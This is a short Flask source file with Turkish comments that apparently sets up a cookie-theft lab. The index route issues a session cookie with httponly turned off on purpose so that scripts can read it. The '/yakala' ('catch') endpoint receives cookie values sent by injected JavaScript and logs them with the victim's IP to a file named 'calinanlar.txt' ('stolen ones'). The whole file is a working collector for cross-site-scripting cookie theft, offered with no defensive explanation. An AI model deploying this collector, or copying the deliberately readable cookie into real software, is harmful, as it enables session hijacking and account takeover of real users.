from flask import Flask, render_template, request, make_response

app = Flask(__name__)

@app.route('/')
def index():
    # Test için kullanıcıya bir çerez verelim (Sanki giriş yapmış gibi)
    response = make_response(render_template('index.html'))
    response.set_cookie('oturum_id', 'FLASK_SESSION_998877', httponly=False) # JS okuyabilsin diye False
    return response

@app.route('/yakala', methods=['GET'])
def yakala():
    # JS'den gelen çerez verisini al
    cerez_verisi = request.args.get('data')
    ip_adresi = request.remote_addr
    
    if cerez_verisi:
        with open("calinanlar.txt", "a") as f:
            f.write(f"IP: {ip_adresi} | Veri: {cerez_verisi}\n")
        print(f"!!! VERİ YAKALANDI: {cerez_verisi}")
        return "200 OK", 200
    return "400 Bad Request", 400

if __name__ == '__main__':
    app.run(debug=True, port=5000)
